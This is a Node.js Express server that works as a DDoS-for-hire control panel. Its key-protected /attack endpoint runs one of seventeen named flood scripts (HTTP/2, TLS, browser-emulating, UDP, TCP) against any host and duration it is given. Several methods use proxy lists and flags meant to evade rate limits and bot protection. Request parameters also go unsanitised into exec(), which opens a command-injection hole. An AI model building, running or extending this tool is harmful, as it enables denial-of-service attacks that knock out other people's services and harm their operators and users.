const express = require("express");
const path = require("path");
const { exec } = require("child_process");

const app = express();
const PORT = 2906;
const API_KEY = "vernitiger";

const attackCommands = {
    MIX: `node ./lib/mixed.js {host} {time} 2 12 proxy.txt --redirect false --ratelimit false --query false --stealth true --adaptive true`,
    VFLOOD: `node ./lib/VFLOOD.js {host} {time} 12 2`,
    HTTPS: `node ./lib/HTTPS.js {host} {time} 12 2 proxy.txt`,
    H2: `node ./lib/FAST.js {host} {time} 3 12`,
    FAST: `node ./lib/H2.js GET {host} {time} 3 12 proxy.txt`,
    MIXBILL: `node ./lib/MIXBILL.js {host} {time} 12 2`,
    TLS: `node ./lib/TLS.js {host} {time} 12 2 proxy.txt`,
    HYBRID: `node ./lib/HYBRID.js {host} {time} 2 12 proxy.txt`,
    BROWSER: `node ./lib/BROWSER.js {host} 4 active.txt 64 {time}`,
    BROW: `node ./lib/BROW.js {host} 10 proxy.txt 30 {time}`,
    "H2-VERN": `node ./lib/H2-VERN.js {host} {time} 12 2 proxy.txt jawa=jawa --flood --delaytime 1 --cookie "bypassing=%RAND%" --querystring 1 --botfmode true --postdata "user=f&pass=%RAND%" --referers https://www.google.com --header # --randrate`,
    "H2-JOUMA": `node ./lib/H2-JOUMA.js {host} {time} 12 3 proxy.txt`,
    "VERN-B": `node ./lib/VERN-B.js {host} {time} 12 3 proxy.txt`,
    "H2-FURY": `node ./lib/H2-FURY.js GET {host} {time} 10 10 proxy.txt --header "x-device-id:ABCD1234EFGH5678IJKL9012MNOP3456#x-session-id:XYZ9876543210#x-requested-with:XMLHttpRequest#x-webgl-renderer:WebKit WebGL#x-webgl-extensions:EXT_texture_filter_anisotropic, EXT_blend_minmax#x-canvas-fingerprint:QWERTY123456ASDF" --randrate 1 --legit --full`,
    HOLD: `node ./lib/HOLD.js GET {host} {time} 4 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true --legit --full --debug`,
    UDP: `./lib/UDP {host} {port} {time}`,
    TCP: `./lib/TCP {host} {port} 2 {time}`
};

app.get("/attack", (req, res) => {
    const { method, host, time, port, key } = req.query;

    if (key !== API_KEY) return res.status(403).json({ error: "Invalid API key" });
    if (!method || !host || !time) return res.status(400).json({ error: "Missing required parameters" });
    if (!attackCommands[method]) return res.status(400).json({ error: "Invalid attack method" });

    let command = attackCommands[method].replace("{host}", host).replace("{time}", time);
    if (command.includes("{port}")) {
        if (!port) return res.status(400).json({ error: "Missing required parameter: port" });
        command = command.replace("{port}", port);
    }

    exec(command); // Eksekusi tanpa menunggu hasil
    res.json({ status: "Attack started", method, host, time, port });
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(PORT, () => console.log(`API Server running on port ${PORT}`));
